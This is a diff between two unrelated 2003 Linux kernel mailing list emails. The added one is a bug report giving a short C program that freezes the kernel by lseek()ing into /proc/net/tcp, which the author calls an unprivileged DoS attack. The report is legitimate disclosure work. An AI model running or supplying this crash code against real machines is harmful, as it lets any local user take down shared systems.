@@ -1,50 +1,60 @@
 Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S261506AbTK0W7W (ORCPT <rfc822;willy@w.ods.org>);
-	Thu, 27 Nov 2003 17:59:22 -0500
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261522AbTK0W7W
+	id S261563AbTK0XFo (ORCPT <rfc822;willy@w.ods.org>);
+	Thu, 27 Nov 2003 18:05:44 -0500
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261575AbTK0XFo
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Thu, 27 Nov 2003 17:59:22 -0500
-Received: from pentafluge.infradead.org ([213.86.99.235]:39636 "EHLO
-	pentafluge.infradead.org") by vger.kernel.org with ESMTP
-	id S261506AbTK0W7V (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Thu, 27 Nov 2003 17:59:21 -0500
-Subject: Re: APM Suspend Problem
-From: Benjamin Herrenschmidt <benh@kernel.crashing.org>
-To: Misha Nasledov <misha@nasledov.com>
-Cc: Linux Kernel list <linux-kernel@vger.kernel.org>
-In-Reply-To: <20031127062057.GA31974@nasledov.com>
-References: <20031127062057.GA31974@nasledov.com>
+	Thu, 27 Nov 2003 18:05:44 -0500
+Received: from head.linpro.no ([80.232.36.1]:44202 "EHLO head.linpro.no")
+	by vger.kernel.org with ESMTP id S261563AbTK0XFh (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Thu, 27 Nov 2003 18:05:37 -0500
+Subject: [BUG] scheduling while atomic when lseek()ing in /proc/net/tcp
+From: Tore Anderson <tore@linpro.no>
+To: linux-kernel@vger.kernel.org
 Content-Type: text/plain
-Message-Id: <1069921674.6691.202.camel@gaston>
+Organization: Linpro AS
+Message-Id: <1069974335.14367.17.camel@echo.linpro.no>
 Mime-Version: 1.0
 X-Mailer: Ximian Evolution 1.4.5 
-Date: Fri, 28 Nov 2003 09:58:21 +1100
+Date: Fri, 28 Nov 2003 00:05:35 +0100
 Content-Transfer-Encoding: 7bit
-X-SA-Exim-Mail-From: benh@kernel.crashing.org
-X-SA-Exim-Scanned: No; SAEximRunCond expanded to false
-X-Pentafluge-Mail-From: <benh@kernel.crashing.org>
+X-Spam-Score: -4.9 (----)
+X-Scanner: exiscan for exim4 (http://duncanthrax.net/exiscan/) *1APVCY-0003Hv-2h*Yx.6j0rx9KQ*
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
 
-> hdc: start_power_step(step: 0)
-> hdc: completing PM request, suspend
-> hda: start_power_step(step: 0)
-> hda: start_power_step(step: 1)
-> hda: complete_power_step(step: 1, stat: 50, err: 0)
-> hda: completing PM request, suspend
-> hda: Wakeup request inited, waiting for !BSY...
-> hda: start_power_step(step: 1000)
-> blk: queue c138fa00, I/O limit 4095Mb (mask 0xffffffff)
-> hda: completing PM request, resume
-> hdc: Wakeup request inited, waiting for !BSY...
-> hdc: start_power_step(step: 1000)
-> hdc: completing PM request, resume
+  Hi,
 
-Those messages are harmless, they just show normal operations
-of the IDE suspend code. I beleive it's probably time to disable
-the debug code in there ;)
+  The following code instantly freezes my all of my machines running 
+ any of the beavers:
 
-Ben.
+    #include <sys/types.h>
+    #include <sys/stat.h>
+    #include <fcntl.h>
+    #include <unistd.h>
+    #include <stdio.h>
+
+    int main(void) {
+            char buf[8192];
+            int fd, chars;
+            fd = open("/proc/net/tcp", O_RDONLY);
+            chars = read(fd, buf, sizeof(buf));
+            lseek(fd, -chars+1, SEEK_CUR);
+            close(fd);
+            return 0;
+    }
+
+  It only happens when I lseek() anywhere from -chars+1 to -chars+150
+ inclusive (in other words, somewhere on the first line).  I do not
+ need root to abuse this, which makes it an excellent DoS attack for
+ anyone with an unprivileged account.
+
+  I do get an oops, but as I do not have a serial console I'd rather
+ not transcribe it to paper and post it unless it's crucial to
+ pinpointing the bug.
+
+-- 
+Tore Anderson
 
